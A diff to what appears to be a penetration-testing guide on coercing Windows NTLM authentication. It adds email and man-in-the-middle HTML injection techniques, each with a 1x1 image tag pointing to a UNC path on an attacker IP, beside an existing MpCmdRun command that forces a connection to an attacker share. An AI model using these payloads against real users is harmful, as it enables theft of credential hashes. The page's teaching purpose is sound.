@@ -77,6 +77,26 @@ If you are already inside the Windows machine you can force Windows to connect t
 C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
 ```
 
+## HTML injection
+
+### Via email
+
+If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as
+
+```html
+<img src="\\10.10.17.231\test.ico" height="1" width="1" />
+```
+
+and when he opens it, he will try to authenticate.
+
+### MitM
+
+If you can perform a MitM attack to a computer and inject HTML in a page he will visualize you could try injecting an image like the following in the page:
+
+```html
+<img src="\\10.10.17.231\test.ico" height="1" width="1" />
+```
+
 ## Cracking NTLMv1
 
 If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack).\
